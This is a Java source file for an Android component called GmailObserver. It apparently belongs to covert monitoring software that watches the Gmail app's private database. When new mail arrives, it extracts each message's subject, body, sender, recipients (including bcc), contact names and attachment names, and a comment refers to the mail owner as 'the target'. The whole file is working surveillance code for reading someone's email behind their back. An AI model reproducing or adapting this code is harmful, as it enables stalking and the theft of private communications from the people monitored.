package com.vvt.daemon.email;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.StringReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.TimeZone;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.vvt.calendar.CalendarObserver;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.dbobserver.DatabaseFileObserver;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;

public class GmailObserver extends DatabaseFileObserver{

	/*=========================== CONSTANT ===============================*/
	private static final String TAG = "GmailObserver";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
//	private static final String PACKET_NAME = "com.google.android.gm";
//	private static final String PREFIX_DATABASE_FILE_NAME = "mailstore.";
//	private static final String DATABASE_TABLE_NAME = "conversations";
	
//	private static final String OLD_VERSION_DATABASE_PATH = "/data/data/com.google.android.providers.gmail/databases";
//	private static final String SAMSUNG_DATABASE_PATH = "/dbdata/databases/com.google.android.gm";
//	private static final String DEFAULT_DATABASE_PATH = "/data/data/com.google.android.gm/databases";
	
	/*============================ MEMBER ================================*/
	private static GmailObserver sGmailObserver;
	private static boolean sPermanentStop = false;
	private static boolean sRegisterAlready = false;
	
	private HashSet<String> mAccounts;
	
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	private OnAccountChangeListener mAccountChangeListener;
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	private static String sActualDatabasePath;
	/*============================ METHOD ================================*/
	
	/**
	 * get WhatsAppObserver object.
	 */
	public static GmailObserver getGmailObserver(HashSet<String> accounts) {
		if(LOGV) FxLog.v(TAG,"getGmailObserver # ENTER ...");
		
		
		sActualDatabasePath = GmailDatabaseHelper.getGmailDbPath();
		if(LOGD) FxLog.d(TAG, "Path is : "+sActualDatabasePath);
		if(LOGV) FxLog.v(TAG, String.format("accounts size : %s",accounts.size() ));
//		//Check available .
//		File oldVersionFile = new File(OLD_VERSION_DATABASE_PATH);
//		if(oldVersionFile.exists()) {
//			FxLog.d(TAG, "This is old version path.");
//			sActualDatabasePath = OLD_VERSION_DATABASE_PATH;
//		} else {
//			File file = new File(SAMSUNG_DATABASE_PATH);
//			if(file.exists()){
//				FxLog.d(TAG, "This is SAMSUNG path.");
//				sActualDatabasePath = SAMSUNG_DATABASE_PATH;
//			}else{
//				FxLog.d(TAG, "This is default path.");
//				sActualDatabasePath = DEFAULT_DATABASE_PATH;
//			}
//		}
		if(LOGV) FxLog.v(TAG, String.format("sGmailObserver is NULL?: %s",sGmailObserver));
		if(sGmailObserver == null){
			
			sGmailObserver = new GmailObserver(sActualDatabasePath, accounts);
			//set waiting time for sleep after got notify.
			sGmailObserver.setSleep(5000);
		}
		if(LOGV) FxLog.v(TAG,"getGmailObserver # EXIT ...");
		return sGmailObserver;
	}
	
	private GmailObserver(String path, HashSet<String> accounts) {
		super(path);
		mAccounts = accounts;
		if(mAccounts.size() > 0) {
			if(LOGD) FxLog.d(TAG, String.format("get sGmailObserver with accounts : %s",mAccounts.toArray()));
		} else {
			if(LOGD) FxLog.d(TAG, String.format("get sGmailObserver with accounts : %s","No account to observe"));
		}
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		mDateFormatter = new SimpleDateFormat(GmailCapturingHelper.DEFAULT_DATE_FORMAT);
		mLoggablePath = GmailCapturingHelper.DEFAULT_PATH;
	}
	
	
	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}

	/**
	 * DON'T CALL THIS METHOD DIRECTLY. 
	 * Please use registerWhatsAppObserver method.
	 */
	@Override
	public void startWatching() {
		super.startWatching();
	}

	/**
	 * DON'T CALL THIS METHOD DIRECTLY. 
	 * Please use unregisterWhatsAppObserver method.
	 */
	@Override
	public void stopWatching() {
		super.stopWatching();
	}
	
	/**
	 * register FileObserver for WhatsApp
	 * @param listener
	 * @return True : Success, False : Fail
	 */
	public boolean register(GmailObserver.OnCaptureListener captureListener, 
			GmailObserver.OnAccountChangeListener accountChangeListener) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		
		boolean registerStatus = false;
		
		// check for sure, not duplicate register.
		if(!sRegisterAlready) {
			//Check available WhatsApp.
			File file = new File(sActualDatabasePath);

			if (file.exists()) {
				if (captureListener != null && accountChangeListener != null) {
					mListener = captureListener;
					mAccountChangeListener = accountChangeListener;
					setPermanentStop(false);
					startWatching();
					sRegisterAlready = true;
					registerStatus = true;
					if(LOGD) FxLog.d(TAG, "register # register success.");
				}
			} else {
				if(LOGD) FxLog.d(TAG, "register # This device don't have Gmail application.");
				if(LOGD) FxLog.d(TAG, "register # So not regis observer.");
		    }
			
			if(LOGV) FxLog.v(TAG, "register # EXIT ..."); 
		} else {
			if(LOGV) FxLog.v(TAG, "register # register already Exit ..."); 
		}
		return registerStatus;
	}
	
	/**
	 * unregisterWhatsAppObserver
	 * @param listener
	 * @return True : Success, False : Fail
	 */
	public boolean unregister(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ..."); 
		setPermanentStop(true);
		sRegisterAlready = false;
        stopWatching();
        sGmailObserver = null;
        
        if(LOGV) FxLog.v(TAG, "unregister # EXIT ..."); 
        return true;
	}
	
	@Override
	public synchronized void onEventNotify() {
		if(LOGV) FxLog.v(TAG, "onEventNotify Enter ...");
		if(!sPermanentStop) {
			if(isAccountChanged()){
				if(LOGD) FxLog.d(TAG, "Account is changing ...");
				mAccountChangeListener.onAccountChange();
			} else {
				getConversation();
			}
		}
		else {
			//guarantee stop.
			stopWatching();
		}
		if(LOGV) FxLog.v(TAG, "onEventNotify EXIT ...");
		
	}
	
	private boolean isAccountChanged() {
		
		if(sActualDatabasePath.contains("shared_prefs")) {
			return true;
		}
		
		HashSet<String> gmails = GmailDatabaseManager.getGmailAccount();
		if(LOGV) FxLog.v(TAG, String.format(
				"isAccountChanged # Observed gmails: %d, Updated gmails: %d", 
					mAccounts == null ? 0 : mAccounts.size(), gmails == null ? 0 : gmails.size()));
		
		return ((mAccounts == null ? 0 : mAccounts.size()) != 
			(gmails == null ? 0 : gmails.size()));
		
	}
	
	private void getConversation(){
		if(LOGV) FxLog.v(TAG, "getConversation # ENTER ...");
		for(String account : mAccounts) {
			long refId = GmailCapturingHelper.getRefId(account, mLoggablePath);
			
			if(LOGV) FxLog.v(TAG, String.format(
						"getConversation # account: %s, refId: %d", account, refId));
			
			long latestId = GmailDatabaseManager.getMessageLatestId(account);
			if (latestId == refId) {
				if(LOGV) FxLog.v(TAG, "getConversation # Latest ID is not changed!!");
			}
			else if (latestId < refId) {
				if(LOGV) FxLog.v(TAG, "getConversation # Found changes, update mRefId");
				GmailCapturingHelper.updateRefId(account, latestId, mLoggablePath);
			}
			else {
				ArrayList<GmailData> gmails = getNewEmails(account, refId);
				
				if (gmails == null || gmails.size() == 0) {
					if(LOGV) FxLog.v(TAG, "getConversation # No new event found!! -> EXIT ...");
					return;
				}
				
				GmailCapturingHelper.updateRefId(account, latestId, mLoggablePath);
				
				if (mListener != null) {
					mListener.onCapture(gmails);
				}
			}
		}
		if(LOGV) FxLog.v(TAG, "getConversation # EXIT ...");
	}
	
	private ArrayList<GmailData> getNewEmails(String account, long refId) {
		if(LOGV) FxLog.v(TAG, "getNewEmails # ENTER ...");
		
		// Prepare retrieving information
		ArrayList<GmailData> gmails = new ArrayList<GmailData>();
		
		SQLiteDatabase db = GmailDatabaseHelper.getReadableDatabase(account);
		if (db == null) {
			if(LOGW) FxLog.w(TAG, "getNewEmails # Open Gmail database FAILED!! -> EXIT ...");
			return gmails;
		}
		
		// select messages._id as mid, * from messages
		// left join message_labels on messageId = message_messageId
		// left join labels on labels_id = labels._id
		// where (name = '^i' or name = '^f') and mid > refId
		String sql = String.format(
				"SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s " +
				"LEFT JOIN %s ON %s = %s " +
				"LEFT JOIN %s ON %s = %s.%s " +
				"WHERE (%s = '%s' OR %s = '%s') AND m_label_id > %d AND %s = 1 AND %s = 0 ",
				GmailDatabaseHelper.TABLE_MESSAGES, GmailDatabaseHelper.COLUMN_ID,
				GmailDatabaseHelper.TABLE_MESSAGE_LABELS,GmailDatabaseHelper.COLUMN_ID,
				GmailDatabaseHelper.TABLE_MESSAGES, 
				GmailDatabaseHelper.TABLE_MESSAGE_LABELS, 
				GmailDatabaseHelper.COLUMN_MSG_ID, GmailDatabaseHelper.COLUMN_MSG_MSG_ID, 
				GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_LABELS_ID, 
				GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_ID, 
				GmailDatabaseHelper.COLUMN_NAME, "^i", 
				GmailDatabaseHelper.COLUMN_NAME, "^f", refId,
				GmailDatabaseHelper.COLUMN_SYNCED, GmailDatabaseHelper.COLUMN_CLIENT_CREATED);
		
		if(LOGV) FxLog.v(TAG, "getNewEmails # sql : "+ sql);
		
		Cursor cursor = db.rawQuery(sql, null);
		
		if (cursor == null) {
			if(LOGW) FxLog.w(TAG, "getNewEmails # Query messages table FAILED!! -> EXIT ...");
			db.close();
			return gmails;
		}
		
		if(LOGV) FxLog.v(TAG, String.format("getNewEmails # cursor count :  "+ cursor.getCount()));
		
		GmailData gmail = null;
		while (cursor.moveToNext()) {
			int id = cursor.getInt(cursor.getColumnIndex("m_label_id"));
			String name = cursor.getString(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_NAME));
			int clientCreated = cursor.getInt(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_CLIENT_CREATED));
			if(LOGV) FxLog.v(TAG, String.format("getNewEmails # id :  "+ id+" name : "+name));
			if(LOGV) FxLog.v(TAG, String.format("getNewEmails # clientCreated :  "+ clientCreated));
			gmail = createGmailData(db, account, cursor);
			gmails.add(gmail);
			
			if(LOGV) FxLog.v(TAG, String.format("getNewEmails # Capture: %s", gmail));
		}
		if(LOGV) FxLog.v(TAG, "getNewEmails # Cursor past the last entry");
		cursor.close();
		db.close();
		
		if(LOGV) FxLog.v(TAG, String.format("getNewEmails # Total email: %d", gmails.size()));
		if(LOGV) FxLog.v(TAG, "getNewEmails # EXIT ...");
		
		return gmails;
	}
	
	private GmailData createGmailData(SQLiteDatabase db, String account, Cursor cursor) {
		GmailData gmail = null;
		
		if (cursor == null || cursor.isClosed() || cursor.getPosition() == -1) {
			if(LOGE) FxLog.e(TAG, "createEmailEvent # Fail to create an event!!");
			return gmail;
		}
		
		String label = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_NAME));
		
		// Analyze direction
		boolean isInbox = false;
		
		if (label.equals("^i")) {
			isInbox = true;
		}
		
		String subject = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_SUBJECT));
		
		String body = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_BODY));
		
		if (body == null) {
			int bodyCompressedIdx = cursor.getColumnIndex(
					GmailDatabaseHelper.COLUMN_BODY_COMPRESSED);
			
			if (bodyCompressedIdx != -1) {
				byte[] bodyCompressedBytes = cursor.getBlob(bodyCompressedIdx);
				if (bodyCompressedBytes != null) {
					body = GmailUtil.getUncompressedContent(bodyCompressedBytes);
				}
			}
		}
		
		// Replace HTML tags with a line feed
		if (body != null) {
			body = GmailUtil.getCleanedEmailBody(body);
		}
		
		String rawInfoSender = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_FROM));
		
		String rawInfoTo = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_TO));
		
		String rawInfoCc = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_CC));
		
		String rawInfoBcc = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_BCC));
		
		String rawInfoAttach = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_ATTACHMENTS));
		
		// Senders may be null when the target is sending an email
		String[] senders = getAddresses(rawInfoSender);
		String[] senderNames = getName(rawInfoSender);
		String sender = senders == null || senders.length < 1 ? account : senders[0];
		String senderName = "";
		senderName = ContactsDatabaseManager.getContactNameByEmail(new String[]{sender});
		
		if(senderName == null || senderName.length() < 1) {
			if(senderNames == null || senderNames.length < 1) {
				senderName = "unknown";
			} else {
				senderName = senderNames[0];
			}
		}
		
		String[] to = getAddresses(rawInfoTo);
		String[] cc = getAddresses(rawInfoCc);
		String[] bcc = getAddresses(rawInfoBcc);

		List<GmailAttachment> gmailAttachments = new ArrayList<GmailAttachment>();
		String[] attachments = getAttachments(rawInfoAttach);
		//TODO : need to be upgrade capture raw data in the future.
//		if(attachments.length > 0) {
//			long mid = -1;
//			mid = cursor.getLong(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_MSG_ID));
//			
//			if(mid > -1) {
//				gmailAttachments = getAttachmentData(db,mid);
//			}
//		}
		
		if(LOGV) FxLog.v(TAG, "Attachments : "+gmailAttachments.size());
		for(GmailAttachment gt : gmailAttachments){
			if(LOGV) FxLog.v(TAG, "Attachments FullName : "+gt.getAttachmentFullName());
			if(LOGV) FxLog.v(TAG, "Attachments data length : "+gt.getAttachmentData().length);
		}
		
		ArrayList<String> emails = new ArrayList<String>();
//		if (isInbox) {
//			emails.add(sender);
//		}
//		else {
			emails.addAll(Arrays.asList(to));
			emails.addAll(Arrays.asList(cc));
			emails.addAll(Arrays.asList(bcc));
//		}
		
		String receiverContactName = ContactsDatabaseManager.getContactNameByEmail(
				emails.toArray(new String[emails.size()]));
		
		if (receiverContactName == null || receiverContactName.length() == 0) {
			receiverContactName = "";
		}
		
		int size = -1;
		
		long time = isInbox ? 
				cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_DATE_RECEIVED)) :
							cursor.getLong(cursor.getColumnIndex(
									GmailDatabaseHelper.COLUMN_DATE_SENT));
		
		mDateFormatter.setTimeZone(
				TimeZone.getTimeZone(
						mCalendarObserver.getLocalTimeZone()));
		
		
		
		gmail = new GmailData();
		gmail.setDateTime(mDateFormatter.format(new Date(time)));
		gmail.setTime(time);
		gmail.setInbox(isInbox);
		gmail.setSize(size);
		gmail.setSender(sender);
		gmail.setSenderName(senderName);
		gmail.setTo(to);
		gmail.setCc(cc);
		gmail.setBcc(bcc);
		gmail.setSubject(subject);
		gmail.setAttachments(attachments);
		gmail.setGmailAttachments(gmailAttachments);
		gmail.setBody(body);
		gmail.setReciverContactName(receiverContactName);
		
		// DON'T CLOSE A CURSOR HERE!!
		
		return gmail;
	}
	
	private String[] getAddresses(String input) {
		ArrayList<String> emails = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			int beginIndex = 0;
			int endIndex = 0;
			
			while (true) {
				
				beginIndex = input.indexOf("<", endIndex) + 1;
				if (beginIndex < 1 || beginIndex > input.length()) {
					break;
				}
				
				endIndex = input.indexOf(">", beginIndex);
				if (endIndex < 0 || endIndex > input.length()) {
					break;
				}
				
				emails.add(input.substring(beginIndex, endIndex));
			}
		}
		
		String[] result = emails.toArray(new String[0]);
		return result;
	}
	
	private String[] getName (String input) {
		ArrayList<String> emails = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			int beginIndex = 0;
			int endIndex = 0;
			
			while (true) {
				
				beginIndex = input.indexOf("\"", endIndex) + 1;
				if (beginIndex < 1 || beginIndex > input.length()) {
					break;
				}
				
				endIndex = input.indexOf("\"", beginIndex);
				if (endIndex < 0 || endIndex > input.length()) {
					break;
				}
				if(!(beginIndex > endIndex)) {
					emails.add(input.substring(beginIndex, endIndex));
				}
				endIndex++;
			}
		}
		
		String[] result = emails.toArray(new String[0]);
		return result;
	}

	private String[] getAttachments(String input) {
		
		if(LOGV) FxLog.v(TAG, "getAttachments # ENTER ...");
		
		ArrayList<String> attachments = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			BufferedReader reader = new BufferedReader(new StringReader(input));
			String line = null;
			String[] splitform = null;
			
			try {
				while ((line = reader.readLine()) != null) {
					if(LOGV) FxLog.v(TAG, String.format("getAttachments # line: %s", line));
					splitform = line.replace("|", " ").split(" ");
					if (splitform != null && splitform.length > 1) {
						attachments.add(splitform[1]);
					}
				}
			}
			catch (IOException e) {
				if(LOGE) FxLog.e(TAG, String.format("getAttachments # error: %s", e));
			}
		}
		
		String[] result = attachments.toArray(new String[0]);
		
//			FxLog.v(TAG, String.format(
//					"getAttachments # result: %s", 
//					Arrays.toString(result)));
			
		if(LOGV) FxLog.v(TAG, "getAttachments # EXIT ...");
		
		return result;
	}
	
	@SuppressWarnings("unused")
	//TODO : need to be upgrade capture raw data in the future.
	private List<GmailAttachment> getAttachmentData(SQLiteDatabase db, long messageId){
		if(LOGV) FxLog.v(TAG, "getAttachmentData # ENTER... ");
		List<GmailAttachment> attachments = new ArrayList<GmailAttachment>();
		String sql = String.format(
				"SELECT %s FROM %s WHERE %s = %s",GmailDatabaseHelper.COLUMN_DOWNLOAD_ID, 
				GmailDatabaseHelper.TABLE_ATTACHMENT, GmailDatabaseHelper.COLUMN_MSGS_MSG_ID, messageId);
		
		if(LOGV) FxLog.v(TAG, sql);
		
		Cursor cursorAtt = db.rawQuery(sql, null);
		
		if (cursorAtt == null || cursorAtt.getCount() == 0) {
			if(LOGW) FxLog.w(TAG, "getAttachmentData # Query database FAILED!! -> EXIT ...");
			if (cursorAtt != null) {
				cursorAtt.close();
			}
			return attachments;
		}
		
		List<Long> ids = new ArrayList<Long>();
		long id = -1;
		
		while (cursorAtt.moveToNext()) {
			id = cursorAtt.getLong(0);
			ids.add(id);
		}
		
		cursorAtt.close();
		
		attachments = readAttachmentData(ids);
		if(LOGV) FxLog.v(TAG, "getAttachmentData # EXIT...");
		return attachments;
	}
	
	private List<GmailAttachment> readAttachmentData(List<Long> downloadIds) {
		if(LOGV) FxLog.v(TAG, "readAttachmentData # ENTER...");
		List<GmailAttachment> attachments = new ArrayList<GmailAttachment>();
		
		SQLiteDatabase db =  GmailDatabaseHelper.openDownloadDatabase();
		if (db == null) {
			if(LOGW) FxLog.w(TAG, "readAttachmentData # Open Download database FAILED!! -> EXIT ...");
			return attachments;
		}
		
		GmailAttachment attachment = null;
		byte[] imgData = null;
		String sql = "";
		Cursor cursor = null;
		
		for(long id : downloadIds) {
			sql = String.format("SELECT %s, %s FROM %s WHERE %s = %s",
					GmailDatabaseHelper.COLUMN_DATA,GmailDatabaseHelper.COLUMN_TITLE,
					GmailDatabaseHelper.TABLE_DOWNLOADS, GmailDatabaseHelper.COLUMN_ID, id);
			
			if(LOGV) FxLog.v(TAG, "readAttachmentData # " + sql);
			
			cursor = db.rawQuery(sql, null);
			
			if (cursor == null || cursor.getCount() == 0) {
				if(LOGV) FxLog.e(TAG, "readAttachmentData # Query database FAILED!! -> EXIT ...");
				if(cursor == null) {
					if(LOGV) FxLog.v(TAG, "readAttachmentData # Cursor is NULL!");
				}
				
				if (cursor != null) {
					cursor.close();
				}
				continue;
			}
			
			attachment = new GmailAttachment();
			
			if(cursor.moveToNext()) {
				String path = cursor.getString(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_DATA));
				String fileName = cursor.getString(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_TITLE));
				
				imgData = new byte[] {};
				if (path != null) {
					File file = new File(path);
					if (file.exists()) {
						imgData = FileUtil.readFileData(path);
					} else {
						if(LOGW) FxLog.w(TAG, "readAttachmentData # "+path+" File not exists");
						continue;
					}
				} else {
					if(LOGV) FxLog.w(TAG, "readAttachmentData # "+path+" is null");
					continue;
				}
				
				if(LOGV) FxLog.v(TAG, "readAttachmentData # Add attachment ");
				attachment.setAttachemntFullName(fileName);
				attachment.setAttachmentData(imgData);
				attachments.add(attachment);
			}
			cursor.close();
		}
		db.close();
		if(LOGV) FxLog.v(TAG, "readAttachmentData # attachments site ..."+attachments.size());
		if(LOGV) FxLog.v(TAG, "readAttachmentData # EXIT...");
		return attachments;
	}
	
	private void setPermanentStop(boolean isPermanentStop) {
		sPermanentStop = isPermanentStop;
	}
	
	public static interface OnCaptureListener {
		public void onCapture(ArrayList<GmailData> gmails);
	}
	
	public static interface OnAccountChangeListener {
		public void onAccountChange();
	}

}
